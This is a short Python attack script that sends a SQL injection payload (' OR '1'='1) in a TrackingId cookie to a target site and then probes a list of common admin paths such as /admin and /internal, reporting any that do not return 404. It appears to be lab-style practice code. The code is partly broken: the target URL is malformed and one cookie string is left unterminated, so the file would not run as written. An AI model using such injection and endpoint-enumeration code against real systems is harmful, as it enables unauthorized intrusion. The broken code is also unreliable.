import requests

TARGET = "http:/your-site"

cookies = {"TrackingId": "base-tracking-id-123' OR '1'='1"}
r = requests.get(TARGET, cookies=cookies)
print("[+] Status/Response length with SQLi payload:", len(r.text))

admin_paths = [
    "/admin", "/administrator", "/console", "/secret", "/dashboard", 
    "/api/admin", "/portal/admin", "/internal", "/login-admin"
]

for path in admin_paths:
    res = requests.get(TARGET.rstrip('/') + path, cookies={"TrackingId": "base-tracking-id-123'})
    if res.status_code != 404:
        print(f"[+] Potentially endpoint: {path} [Status: {res.status_code}, Len: {len(res.text)}]")
